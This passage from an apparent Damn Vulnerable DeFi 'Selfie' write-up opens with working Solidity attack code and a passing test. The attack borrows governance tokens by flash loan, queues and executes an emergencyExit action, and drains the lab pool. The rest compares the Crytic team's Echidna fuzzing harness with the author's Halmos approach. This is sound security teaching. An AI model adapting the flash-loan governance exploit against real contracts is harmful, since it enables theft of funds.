        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        governance.queueAction(target, value, data);
        DamnValuableVotes(token).approve(address(msg.sender), 2**256 - 1); // unlimited approve for pool
        return (keccak256("ERC3156FlashBorrower.onFlashLoan"));
    }

    function preload() public {
        bytes memory data = "";
        uint256 amount = 0xffe33bfeffedf1800001;
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function attack() public {
        governance.executeAction(1);
    }
}
```
Test:
```solidity
function test_selfie() public checkSolvedByPlayer {
    Attacker attacker = new Attacker(token, governance, pool, recovery);
    attacker.preload();
    vm.warp(block.timestamp + 0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
    attacker.attack();
}
```
Run:
```javascript
$ forge test --mp test/selfie/Selfie.t.sol
...
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.95ms (1.46ms CPU time)
```
Success!
## Fuzzing vs Selfie
I'm very happy that I don't have to prepare this challenge contracts for fuzzing testing. The **Crytic team** already has a ready-made solution to this problem (Damn Vulnerable Defi V3) using Echidna [here](https://github.com/crytic/damn-vulnerable-defi-echidna/blob/solutions/contracts/selfie/EchidnaSelfie.sol). Before a detailed analysis of their solutions, looking ahead, I want to say that this is currently the most vivid example of the difference in approaches to the preparation of contracts in Halmos and Echidna in the case of such non-trivial attacks. And I am really impressed with the work done here. The fact that they did make Echidna work here deserves respect!
### Version differences
in DVD V3 and V4, the very essence of the challenge remained the same, with the same bug. However, there are some differences in key function names and token logic:
1. In V3, the `emergencyExit` function is called `drainAllFunds`.
2. The `onFlashLoan` function is called `receiveTokens`.
3. Logic via `snapshot` is used instead of `ERC20Votes::delegate`.

### Idea overview
To describe the idea briefly: we have a "monstrous" [push-use](https://github.com/igorganich/damn-vulnerable-defi-halmos/blob/master/test/the-rewarder/README.md#analysis-of-the-limits-of-echidna) pattern, where almost all functions that can be called by an attacker are described directly in the code without any abstractions. The first few calls are to "setup" the functions that will then be called by the attacking transaction.
### Reduced number of scenarios
As with Halmos solution, the Echidna-based solution has reduced the number of covered scenarios. But there is a key important difference: basically, they only consider these target functions:
```solidity
enum CallbackActions {
    drainAllFunds,
    transferFrom,
    queueAction,
    executeAction
}
```
In the same time, during the optimizations when working in Halmos, we did not cut out the entire functions that we have to cover. 

I understand why they don't check, for example, `ERC20::transfer`. Otherwise, the code would be even more bloated. More on that a little later. Nevertheless, in my opinion, this is already a very big hint for a fuzzer.
### setup
So, let's find out how Echidna decides which functions will be run in the `receiveTokens` callback.

We have an array where the identifiers of these functions are written:
```solidity
uint256[] private callbackActionsToBeCalled;
```
And there are 4 functions that essentially push IDs into this array:
```solidity
...
function pushDrainAllFundsToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.drainAllFunds));
}
...
function pushTransferFromToCallback(uint256 _amount) external {
    require(_amount > 0, "Cannot transfer zero tokens");
    _transferAmountInCallback.push(_amount);
    callbackActionsToBeCalled.push(uint256(CallbackActions.transferFrom));
}
...
function pushQueueActionToCallback(
    uint256 _weiAmount,
    uint256 _payloadNum,
    uint256 _amountToTransfer
) external {
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        require(_amountToTransfer > 0, "Cannot transfer 0 tokens");
    }
    // add the action into the callback array
    callbackActionsToBeCalled.push(uint256(CallbackActions.queueAction));
    // update payloads mapping
    payloads[payloadsPushedCounter].weiAmount = _weiAmount;
    // create payload
    createPayload(_payloadNum, _amountToTransfer);
}
...
function pushExecuteActionToCallback() external {
    callbackActionsToBeCalled.push(uint256(CallbackActions.executeAction));
}
```
Here it is also worth describing the `createPayload` function, which is performed as part of the `queueAction` push. Since we already know that Echidna is not good at running functions that are passed as target and calldata, we have to work around it somehow:
```solidity
// to store data related to the given payload created by Echidna
struct QueueActionPayload {
    uint256 payloadIdentifier; // createPayload -> logging purposes
    bytes payload; // createPayload
    address receiver; // createPayload
    uint256 weiAmount; // pushQueueActionToCallback
    uint256 transferAmount; // createPayload -> used only if payloadIdentifier == uint256(PayloadTypesInQueueAction.transferFrom)
}
// internal counter of payloads created
mapping(uint256 => QueueActionPayload) payloads;
...
function createPayload(
    uint256 _payloadNum,
    uint256 _amountToTransfer
) internal {
    // optimization: to create only valid payloads, narrowing down the _payloadNum
    _payloadNum = _payloadNum % payloadsLength;
    // cache counter of already pushed payloads to the payload mapping
    uint256 _counter = payloadsPushedCounter;
    // store payload identifier
    payloads[_counter].payloadIdentifier = _payloadNum;
    // initialize payload variables
    bytes memory _payload;
    address _receiver;
    // either create a payload of drainAllFunds funtion if selected
    if (_payloadNum == uint256(PayloadTypesInQueueAction.drainAllFunds)) {
        _payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        );
        _receiver = address(pool);
    }
    // or create a payload of transferFrom function if selected
    if (_payloadNum == uint256(PayloadTypesInQueueAction.transferFrom)) {
        // _transferAmountInPayload.push(_amountToTransfer);
        _payload = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            address(pool),
            address(this),
            _amountToTransfer
        );
        _receiver = address(token);
        // store amount to transfer
        payloads[_counter].transferAmount = _amountToTransfer;
    }
    // fill payload mapping by the variables created
    payloads[_counter].payload = _payload;
    payloads[_counter].receiver = _receiver;
    // increase payload counter (for the next iteration of new payload creation)
    ++payloadsPushedCounter;
}
```
A bit like our Frankenstein from [Truster](https://github.com/igorganich/damn-vulnerable-defi-halmos/tree/master/test/truster#echidna), isn't it? Again, I draw your attention to the fact that only 2 functions that can be launched inside executeAction are considered here, and the function is already so huge. And the parameters of these functions are not abstract, but hardened. Against this background, the usability of Halmos is obvious.
### Call actions
After the setup is complete, the fuzzer has the ability to run all these functions. 
`receiveTokens` has functionality for this:
```solidity
...
 function receiveTokens(address, uint256 _amount) external {
    require(
        msg.sender == address(pool),
        "Only SelfiePool can call this function."
    );
    // logic
    callbackActions();
    // repay the loan
    require(token.transfer(address(pool), _amount), "Flash loan failed");
}
...
function callbackActions() internal {
    uint256 genArrLength = callbackActionsToBeCalled.length;
    if (genArrLength != 0) {
        for (uint256 i; i < genArrLength; i++) {
            callAction(callbackActionsToBeCalled[i]);
        }
    } else {
        revert("actionsToBeCalled is empty, no action called");
    }
}
...
function callAction(uint256 _num) internal {
    // drain all funds
    if (_num == uint256(CallbackActions.drainAllFunds)) {
        drainAllFunds();
    }
    // transfer funds
    if (_num == uint256(CallbackActions.transferFrom)) {
        callbackTransferFrom();
    }
    // queue an action
    if (_num == uint256(CallbackActions.queueAction)) {
        callQueueAction();
        ++payloadsQueuedCounter;
    }
    // execute an action
    if (_num == uint256(CallbackActions.executeAction)) {
        try this.executeAction() {} catch {
            revert("queueAction unsuccessful");
        }
    }
}
```
And, actually, functions that are launched inside `callAction`.
```solidity
...
function drainAllFunds() public {
    pool.drainAllFunds(address(this));
}
...
function callbackTransferFrom() internal {
    // get the amount of tokens to be transfered
    uint256 _amount = _transferAmountInCallback[
        _transferAmountInCallbackCounter
    ];
    // increase the counter
    ++_transferAmountInCallbackCounter;
    // call the transfer function
    transferFrom(_amount);
}
...
function pushTransferFromToCallback(uint256 _amount) external {
    require(_amount > 0, "Cannot transfer zero tokens");
    _transferAmountInCallback.push(_amount);
    callbackActionsToBeCalled.push(uint256(CallbackActions.transferFrom));
}
...
function callQueueAction() internal {
    // cache the current value of counter of already queued actions
    uint256 counter = payloadsQueuedCounter;
    // get queueAction parameters (for more details see SimpleGovernance:SimpleGovernance) based on the current counter
    // 1: weiAmount
    uint256 _weiAmount = payloads[counter].weiAmount;
    require(
        address(this).balance >= _weiAmount,
        "Not sufficient account balance to queue an action"
    );
    // 2: receiver address
    address _receiver = payloads[counter].receiver;
    // 3: payload
    bytes memory _payload = payloads[counter].payload;
    // call the queueAction()
    queueAction(_receiver, _payload, _weiAmount);
}
...
function executeAction() public {
    // get the first unexecuted actionId
    uint256 actionId = actionIds[actionIdCounter];
    // increase action Id counter
    actionIdCounter = actionIdCounter + 1;
    // get data related to the action to be executed
    (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
        actionId
    );
    require(
        address(this).balance >= weiAmount,
        "Not sufficient account balance to execute the action"
    );
    require(
        block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
        "Time for action execution has not passed yet"
    );
    // Action
    governance.executeAction{value: weiAmount}(actionId);
    // increase counter of payloads executed
    ++payloadsExecutedCounter;
}
```
As a result, Echidna must find such a set of setup functions in which the invariant is broken when the attack is launched.

I missed some details, but I would recommend you read the full solution by yourself.
## Conclusions
1. Optimization and heuristics will be an integral part of preparing sufficiently complex contracts for symbolic testing. There is no escaping this and you need to gain experience in their correct application.
2. You can expand the number of symbolic transactions not only in the **SymbolicAttacker** entry point, but also in symbolic callbacks. This may save us resources.
3. If we are looking for an attack - sometimes you can find a bug by not looking for a direct counterexample, but simply by finding **SOMETHING UNEXPECTED**. It is not possible to come up with some clear algorithm here, only it is possible to advise the studying of the business logic of the contract and make new invariants based on this.
4. The comparison of fuzzing and symbolic analysis approaches based on this challenge has most clearly shown the advantage of Halmos when testing contracts with a high level of logic abstraction. The fuzzing preparation looks like a big overengineering, while the symbolic execution preparation is certainly not as easy as we're used to, but still pretty straightforward.
 